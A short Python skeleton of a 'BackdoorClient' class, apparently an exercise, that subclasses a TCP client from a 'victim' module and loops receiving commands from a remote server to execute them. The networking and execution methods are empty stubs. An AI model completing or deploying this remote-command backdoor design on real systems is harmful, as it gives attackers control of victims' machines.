from victim.client.TCPClient import TCPClient


class BackdoorClient(TCPClient):
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def connect(self):
        ...

    def send_data(self, data):
        ...

    def receive_data(self, size):
        ...

    def run(self):
        self.connect()

        while True:
            command = self.receive_data(1024).decode("utf-8")
            self.execute_command(command)

    def execute_command(self, command):
        ...